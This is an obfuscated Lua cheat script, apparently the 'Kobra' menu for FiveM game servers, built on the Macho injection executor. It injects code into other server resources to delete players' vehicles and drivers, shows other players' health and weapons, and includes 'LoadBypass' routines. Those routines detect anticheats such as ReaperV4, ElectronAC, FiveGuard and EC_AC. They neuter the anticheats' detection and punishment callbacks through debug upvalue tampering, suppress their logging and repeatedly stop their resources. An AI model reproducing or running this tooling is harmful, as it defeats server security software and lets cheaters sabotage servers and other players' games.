NetworkRequestControlOfEntity(v1397);v1581=1 + 0 ;end if (v1581==(1925 -(1606 + 318))) then Wait(0);break;end end end return NetworkHasControlOfEntity(v1397);end if (v1399==0) then v1398=v1398 or 2000 ;v1400=GetGameTimer();v1399=1820 -(298 + 1521) ;end end end local function v1339(v1401) local v1402=math.rad(v1401.z);local v1403=math.rad(v1401.x);local v1404=math.abs(math.cos(v1403));return vector3( -math.sin(v1402) * v1404 ,math.cos(v1402) * v1404 ,math.sin(v1403));end function GetEmptySeat(v1405) local v1406={ -(311 -(154 + 156)),0 -0 ,1116 -(712 + 403) ,3 -1 };for v1491,v1492 in ipairs(v1406) do if IsVehicleSeatFree(v1405,v1492) then return v1492;end end return  -(1 + 0);end local v1340=PlayerPedId();local v1341=GetEntityCoords(v1340);local v1342=GetCamCoord(_G.KobraFreecamObject);local v1343=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1344=v1339(v1343);local v1345=2822 -1822 ;local v1346=v1342 + (v1344 * v1345) ;local v1347=StartShapeTestRay(v1342.x,v1342.y,v1342.z,v1346.x,v1346.y,v1346.z, -(1452 -(1242 + 209)),v1340,679 -(20 + 659) );local v1348,v1349,v1350,v1348,v1351=GetShapeTestResult(v1347);local function v1352(v1407) local v1408=0 + 0 ;local v1409;while true do if ((0 + 0)==v1408) then if ( not v1407 or  not DoesEntityExist(v1407)) then return;end v1409=GetPedInVehicleSeat(v1407, -(1 -0));v1408=1;end if (v1408==(1 -0)) then if ((v1409~=0) and DoesEntityExist(v1409)) then local v1596=0;while true do if (v1596==0) then SetPedIntoVehicle(v1340,v1407,0);v1338(v1407,2619 -(427 + 192) );Wait(10);for v1654=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1409   .. [[)
                                        ]] );end v1596=2 -1 ;end if (v1596==3) then Wait(250);SetPedIntoVehicle(v1340,v1407, -(1 + 0));break;end if (v1596==(1949 -(1427 + 520))) then Wait(1);SetPedIntoVehicle(v1340,v1407, -(1 + 0));Wait(1707 -1257 );ClearPedTasksImmediately(v1340);v1596=3 + 0 ;end if (v1596==(1233 -(712 + 520))) then Wait(99 -59 );SetPedIntoVehicle(v1340,v1407, -(1347 -(565 + 781)));Wait(566 -(35 + 530) );SetPedIntoVehicle(v1340,v1407,GetEmptySeat(v1407));v1596=1 + 1 ;end end end break;end end end CreateThread(function() if v1349 then if ((v1351~=0) and IsEntityAVehicle(v1351)) then local v1582=0 -0 ;local v1583;while true do if (v1582==(1378 -(1330 + 48))) then v1583=v1351;v1352(v1583);break;end end end end end);end elseif (v814=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1353=0 + 0 ;local v1354;while true do if (v1353==0) then v1354=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1354,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1538,v1539) local v1540=_G[v1538];if ( not v1540 or (type(v1540)~="function")) then return;end _G[v1538]=function(...) return v1539(v1540,...);end;end hNative("CreateThread",function(v1541,...) return v1541(...);end);hNative("Wait",function(v1542,...) return v1542(...);end);hNative("DoesEntityExist",function(v1543,...) return v1543(...);end);hNative("GetEntityCoords",function(v1544,...) return v1544(...);end);hNative("GetCamCoord",function(v1545,...) return v1545(...);end);hNative("GetCamRot",function(v1546,...) return v1546(...);end);hNative("StartShapeTestRay",function(v1547,...) return v1547(...);end);hNative("GetShapeTestResult",function(v1548,...) return v1548(...);end);hNative("GetPedInVehicleSeat",function(v1549,...) return v1549(...);end);hNative("SetEntityVisible",function(v1550,...) return v1550(...);end);hNative("DeletePed",function(v1551,...) return v1551(...);end);hNative("ClearPedTasksImmediately",function(v1552,...) return v1552(...);end);hNative("SetEntityCoordsNoOffset",function(v1553,...) return v1553(...);end);hNative("IsEntityAVehicle",function(v1554,...) return v1554(...);end);hNative("SetPedIntoVehicle",function(v1555,...) return v1555(...);end);hNative("PlayerPedId",function(v1556,...) return v1556(...);end);hNative("NetworkRequestControlOfEntity",function(v1557,...) return v1557(...);end);hNative("NetworkHasControlOfEntity",function(v1558,...) return v1558(...);end);local function v1493(v1559,v1560) v1560=v1560 or 2000 ;local v1561=GetGameTimer();while (GetGameTimer() -v1561)<v1560  do if NetworkHasControlOfEntity(v1559) then return true;end NetworkRequestControlOfEntity(v1559);Wait(0 + 0 );end return NetworkHasControlOfEntity(v1559);end local function v1494(v1562) local v1563=math.rad(v1562.z);local v1564=math.rad(v1562.x);local v1565=math.abs(math.cos(v1564));return vector3( -math.sin(v1563) * v1565 ,math.cos(v1563) * v1565 ,math.sin(v1564));end function GetEmptySeat(v1566) local v1567=0;local v1568;while true do if (v1567==(1 -0)) then return  -(4 -3);end if (0==v1567) then v1568={ -(3 -2),0,45 -(31 + 13) ,4 -2 };for v1639,v1640 in ipairs(v1568) do if IsVehicleSeatFree(v1566,v1640) then return v1640;end end v1567=1 + 0 ;end end end local v1495=PlayerPedId();local v1496=GetEntityCoords(v1495);local v1497=GetCamCoord(_G.KobraFreecamObject);local v1498=GetCamRot(_G.KobraFreecamObject,565 -(281 + 282) );local v1499=v1494(v1498);local v1500=1000;local v1501=v1497 + (v1499 * v1500) ;local v1502=StartShapeTestRay(v1497.x,v1497.y,v1497.z,v1501.x,v1501.y,v1501.z, -(2 -1),v1495,0 + 0 );local v1503,v1504,v1505,v1503,v1506=GetShapeTestResult(v1502);local function v1507(v1569) local v1570=949 -(216 + 733) ;local v1571;while true do if (v1570==0) then if ( not v1569 or  not DoesEntityExist(v1569)) then return;end v1571=GetPedInVehicleSeat(v1569, -(1848 -(137 + 1710)));v1570=1;end if (v1570==(2 -1)) then if ((v1571~=0) and DoesEntityExist(v1571)) then SetPedIntoVehicle(v1495,v1569,0);v1493(v1569,2538 -(100 + 438) );Wait(1375 -(205 + 1160) );for v1653=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1571   .. [[)
                                        ]] );end Wait(28 + 12 );SetPedIntoVehicle(v1495,v1569, -(1 + 0));Wait(1306 -(535 + 770) );SetPedIntoVehicle(v1495,v1569,GetEmptySeat(v1569));Wait(1 + 0 );SetPedIntoVehicle(v1495,v1569, -1);Wait(247 + 203 );ClearPedTasksImmediately(v1495);SetEntityCoordsNoOffset(v1495,v1496.x,v1496.y,v1496.z,true,true,true,true);Wait(2094 -(211 + 1783) );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1569   .. [[)
                                    ]] );else SetPedIntoVehicle(v1495,v1569, -(1 + 0));Wait(1529 -(1236 + 193) );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1569   .. [[)
                                    ]] );Wait(1010 -(793 + 117) );SetEntityCoordsNoOffset(v1495,v1496.x,v1496.y,v1496.z,true,true,true,true);end break;end end end CreateThread(function() if v1504 then if ((v1506~=0) and IsEntityAVehicle(v1506)) then local v1641=1892 -(1607 + 285) ;local v1642;while true do if (v1641==0) then v1642=v1506;v1507(v1642);break;end end end end end);end end end end local v490=v17[v15];if v490 then if ((v490.type=="slider") or (v490.type=="slider-checkbox")) then local v815=860 -(747 + 113) ;local v816;local v817;while true do if (v815==(1976 -(80 + 1896))) then v816=v490.max or (482 -382) ;v817=GetGameTimer();v815=1 -0 ;end if (v815==(1 + 0)) then if (v816<=(23 -13)) then if (IsControlPressed(0,92 + 82 ) and ((v817-v293)>v294)) then local v1213=0;while true do if (v1213==(0 -0)) then v12:ScrollTwo("Left");v293=v817;break;end end elseif (IsControlPressed(0 + 0 ,175) and ((v817-v293)>v294)) then local v1317=0 + 0 ;while true do if (v1317==(0 -0)) then v12:ScrollTwo("Right");v293=v817;break;end end end elseif IsControlPressed(454 -(246 + 208) ,2066 -(614 + 1278) ) then v12:ScrollTwo("Left");elseif IsControlPressed(0 + 0 ,489 -(249 + 65) ) then v12:ScrollTwo("Right");end break;end end end end end end);local v102=0 -0 ;local v103=120;local v104=1275 -(726 + 549) ;local v105=81 + 39 ;local v106=0;local v107=1544 -(916 + 508) ;MachoOnKeyDown(function(v295) local v296=tonumber(v295) or v295 ;local v297=v44[v296] or "Unknown" ;local v298=GetGameTimer();if (v297==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v297=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v297=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v297=="Q") and ((v298-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v297=="E") and ((v298-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v297=="ArrowUp") and ((v298-v102)>v103)) then if v13 then v12:ScrollOne("Up");v102=v298;end elseif ((v297=="ArrowDown") and ((v298-v102)>v103)) then if v13 then v12:ScrollOne("Down");v102=v298;end elseif (v297=="ArrowLeft") then local v1410=0 -0 ;local v1411;while true do if (0==v1410) then v1411=v17[v15];if v1411 then if ((v1411.type=="slider") or ((v1411.type=="slider-checkbox") and ((v298-v104)>v105))) then local v1648=v1411.max or (65 + 35) ;local v1649=GetGameTimer();if (v1648<=10) then v12:ScrollTwo("Left");v104=v1649;else v12:ScrollTwo("Left");end elseif ((v1411.type=="scrollable") or (v1411.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v297=="ArrowRight") then local v1572=323 -(140 + 183) ;local v1573;while true do if (v1572==(0 + 0)) then v1573=v17[v15];if v1573 then if ((v1573.type=="slider") or ((v1573.type=="slider-checkbox") and ((v298-v104)>v105))) then local v1655=v1573.max or 100 ;local v1656=GetGameTimer();if (v1655<=(574 -(297 + 267))) then local v1661=0 + 0 ;while true do if (v1661==(342 -(37 + 305))) then v12:ScrollTwo("Right");v104=v1656;break;end end else v12:ScrollTwo("Right");end elseif ((v1573.type=="scrollable") or (v1573.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v297=="F5") then local v1584=1266 -(323 + 943) ;local v1585;while true do if (v1584==0) then v1585=v17[v15];if (v13 and v24 and v1585 and ((v1585.type=="button") or (v1585.type=="checkbox") or (v1585.type=="slider-checkbox"))) then local v1657=0 + 0 ;while true do if (v1657==(0 -0)) then v12:HideUI();Wait(1785 -(394 + 1141) );v1657=1;end if (v1657==(1 + 0)) then v60(("Bind %s"):format(v1585.label),"",function(v1663) for v1667,v1668 in pairs(v44) do if (v1668:lower()==v1663:lower()) then local v1670=0;local v1671;while true do if (v1670==(1 + 1)) then v12:ShowUI();return;end if (v1670==(0 + 0)) then v1671=v45[v1667];for v1675,v1676 in pairs(v25) do if (v1676.keyRaw==v1667) then local v1678=0 -0 ;while true do if (v1678==(0 -0)) then v12:Notify("error","Kobra","There is already a keybind with that key!",2748 + 252 );return;end end end end v1670=1 + 0 ;end if (v1670==(530 -(87 + 442))) then if v1671 then local v1677=0;while true do if (v1677==0) then v25[ #v25 + 1 ]={key=v1671,keyRaw=v1667,keyLabel=v44[v1667],type=v1585.type,label=v1585.label,checked=v1585.checked or false ,value=v1585.value or (806 -(13 + 792)) ,step=v1585.step or (0.25 + 0) ,min=v1585.min or 0.25 ,max=v1585.max or 5 ,onSelect=v1585.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(208 + 292 );v1670=2 + 0 ;end end end end end,"keybind");break;end end end break;end end elseif v24 then for v1651,v1652 in pairs(v25) do if (v1652.type=="button") then local v1658=v1652.keyRaw;if v1658 then if (v1658==v296) then local v1664=1865 -(1231 + 634) ;while true do if (v1664==0) then v1652.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1652.label),3000);break;end end end end elseif (v1652.type=="checkbox") then local v1662=v1652.keyRaw;if (v1662 and (v1662==v296)) then local v1665=1766 -(1362 + 404) ;while true do if ((2 -1)==v1665) then if v1652.onSelect then v1652.onSelect(v1652.checked);end v12:ShowKeybindList(v25);v1665=2;end if (2==v1665) then v12:Notify((v1652.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1652.checked and "enabled") or "disabled" ,v1652.label),3000);if v13 then v12:UpdateElements(v17);end break;end if (v1665==0) then v1652.checked= not v1652.checked;v12:UpdateTabChecked(v16,v1652.label,v1652.checked);v1665=1 + 0 ;end end end elseif (v1652.type=="slider-checkbox") then local v1666=v1652.keyRaw;if (v1666 and (v1666==v296)) then local v1669=0;while true do if (1==v1669) then if v1652.onSelect then v1652.onSelect(v1652.value,v1652.checked);end v12:ShowKeybindList(v25);v1669=5 -3 ;end if (v1669==0) then v1652.checked= not v1652.checked;v12:UpdateTabChecked(v16,v1652.label,v1652.checked);v1669=1017 -(660 + 356) ;end if (v1669==(2 -0)) then v12:Notify((v1652.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1652.checked and "enabled") or "disabled" ,v1652.label),3000);if v13 then v12:UpdateElements(v17);end break;end end end end end end end);v12.InListMenu=function(v299) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v300) if ( not v18 or  not v18[v19]) then return;end local v301=v18[v19];if (v301.label~="List") then return;end for v491,v492 in ipairs(v301.tabs) do if (v492.type=="checkbox") then v492.checked=true;if (v492.serverId and tonumber(v492.serverId)) then v27[tonumber(v492.serverId)]=true;end end end v300:UpdateElements(v17);end;v12.UnselectEveryone=function(v302) local v303=0 + 0 ;local v304;while true do if (v303==(1952 -(1111 + 839))) then v302:UpdateElements(v17);break;end if (v303==(951 -(496 + 455))) then if ( not v18 or  not v18[v19]) then return;end v304=v18[v19];v303=699 -(66 + 632) ;end if (v303==(1 -0)) then if (v304.label~="List") then return;end for v738,v739 in ipairs(v304.tabs) do if (v739.type=="checkbox") then v739.checked=false;if (v739.serverId and tonumber(v739.serverId)) then v27[tonumber(v739.serverId)]=false;end end end v303=1138 -(441 + 695) ;end end end;v12.ClearSelection=function(v305) v27={};if (v18 and v18[v19]) then local v584=0;local v585;while true do if (v584==(0 -0)) then v585=v18[v19];if ((v585.label=="List") and v585.tabs) then for v1039,v1040 in ipairs(v585.tabs) do if (v1040.type=="checkbox") then v1040.checked=false;end end end break;end end end v12:UnselectEveryone();end;v12.UpdateListMenu=function(v306) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v307=v18[v19];if (v307.label~="List") then return;end local v308=GetEntityCoords(PlayerPedId());if  not v308 then return;end local v309=v306:GetNearbyPlayers(v308,656 -306 ,true);local v310;for v493,v494 in ipairs(v307.tabs) do if ((v494.type=="divider") and (v494.label=="Nearby Players")) then v310=v493;break;end end if  not v310 then return;end for v495= #v307.tabs,v310 + (4 -3) , -1 do table.remove(v307.tabs,v495);end if ( #v309==(0 + 0)) then v307.tabs[ #v307.tabs + (1839 -(286 + 1552)) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v309,function(v667,v668) return tonumber(v667.serverId)<tonumber(v668.serverId) ;end);for v669,v670 in ipairs(v309) do local v671=tonumber(v670.serverId);if (v671 and v670.name) then local v820,v821=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v671)));v307.tabs[ #v307.tabs + (1278 -(1016 + 261)) ]={type="checkbox",label=("%s - [%s]"):format(v670.name,v671),serverId=v671,checked=v27[v671] or false ,name=v670.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671))) , -(1321 -(708 + 612)))==GetPlayerPed(GetPlayerFromServerId(v671))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v671)))))   .. ".0m" },{key="Server ID",value=v671},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v671))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v671))),color="0, 132, 255"},{key="Weapon",value=v28[v821] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v671)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v671))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v671))) * 3.6 )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v671))) and "Visible") or "Invisible" }},onSelect=function(v855) v27[v671]=v855 or false ;end};end end end for v496,v497 in pairs(v27) do local v498=false;for v587,v588 in ipairs(v309) do if (tonumber(v588.serverId)==tonumber(v496)) then v498=true;break;end end if  not v498 then v27[v496]=nil;end end v15=math.min(v15 or 1 ,math.max(1736 -(339 + 1396) , #v307.tabs));local v311,v312=pcall(function() v306:UpdateElements(v17);end);if  not v311 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v312) );end end;v12.AssignListMenuActions=function(v313) local v314=0;while true do if (v314==(0 + 0)) then if  not v16 then return;end for v740,v741 in ipairs(v16) do if ((v741.label=="Server") and v741.categories) then for v969,v970 in ipairs(v741.categories) do if ((v970.label=="List") and v970.tabs) then for v1153,v1154 in ipairs(v970.tabs) do if (v1154.type=="button") then if (v1154.label=="Select Everyone") then v1154.onSelect=function() v12:SelectEveryone();end;elseif (v1154.label=="Un-Select Everyone") then v1154.onSelect=function() v12:UnselectEveryone();end;elseif (v1154.label=="Clear Selection") then v1154.onSelect=function() v12:ClearSelection();end;end end end end end end end break;end end end;CreateThread(function() while true do local v499=0 + 0 ;while true do if (v499==(0 -0)) then Wait(1500);if (v12:InListMenu() and v13) then local v857=0 + 0 ;local v858;local v859;while true do if (v857==0) then v858,v859=pcall(function() v12:UpdateListMenu();end);if  not v858 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v859) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() local v315=0 + 0 ;while true do if (v315==(347 -(187 + 160))) then for v742=0 -0 ,GetNumResources() -(3 -2)  do local v743=0 + 0 ;local v744;local v745;while true do if (v743==(0 -0)) then v744=GetResourceByFindIndex(v742);v745=LoadResourceFile(v744,"fxmanifest.lua");v743=1 + 0 ;end if (v743==1) then if (v745 and (string.find(v745,"https://electron-services.com") or string.find(v745,"Electron Services") or string.find(v745,"The most advanced fiveM anticheat"))) then local v1118=0;while true do if (v1118==(1 + 0)) then return v744;end if (v1118==0) then v114=v744;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v744 );v1118=1;end end end break;end end end return nil;end end end local function v117() for v500=0,GetNumResources() -1  do local v501=GetResourceByFindIndex(v500);local v502=GetNumResourceMetadata(v501,"client_script");for v589=0,v502-1  do local v590=GetResourceMetadata(v501,"client_script",v589);if (v590 and string.find(v590,"obfuscated")) then v115=v501;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v501 );return v501;end end end return nil;end v12.LoadBypass=function(v316) local v317=0 -0 ;local v318;local v319;while true do if (v317==(328 -(56 + 272))) then v318={"216.146.24.88:30120","91.190.154.74:30120"};v319=GetCurrentServerEndpoint();v317=1 + 0 ;end if (v317==(4 -2)) then v116();v117();v317=2 + 1 ;end if (v317==4) then if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3640 -(455 + 185) );elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",3788 -(757 + 31) );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",3000);elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",4999 -(762 + 1237) );end break;end if (v317==(5 -2)) then Wait(1269 -(265 + 4) );if (GetResourceState("ReaperV4")=="started") then MachoInjectResource2(4 -2 ,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -0 ,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,8 -5 ;end);MachoHookNative(12777102000000000000 -  -181283955 ,function(...) return false,true;end);MachoHookNative(15349248000000000000 -  -164718543 ,function(...) return false,0;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);print("ReaperV4 Bypass Enabled");v316:Notify("info","Kobra","ReaperV4 Bypass Loaded",5863 -2863 );elseif (v114~=nil) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(2,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);elseif (v115~=nil) then local v1119=1734 -(1691 + 43) ;while true do if (v1119==(0 + 0)) then CreateThread(function() while true do MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );Wait(6267 -4267 );end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1192=0 + 0 ;local v1193;while true do if ((0 -0)==v1192) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1192=177 -(127 + 49) ;end if (v1192==1) then v1193={"EC_AC"};for v1355=1660 -(184 + 1475) , #v1193 do local v1356=v1193[v1355];MachoInjectResource(v1356,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1335 -285 );end v1192=4 -2 ;end if ((4 -2)==v1192) then CreateThread(function() while true do Wait(0 + 0 );MachoResourceStop("EC_AC");end end);break;end end end v317=4 + 0 ;end if (v317==1) then for v746,v747 in ipairs(v318) do if (v319==v747) then local v860=0;while true do if (v860==(1291 -(260 + 1031))) then v316:Notify("error","Kobra","Bypass disabled for this server.",4177 -(313 + 864) );return;end end end end v316:Notify("info","Kobra","Loading Anticheat Bypass...",3692 -(655 + 37) );v317=2 + 0 ;end end end;
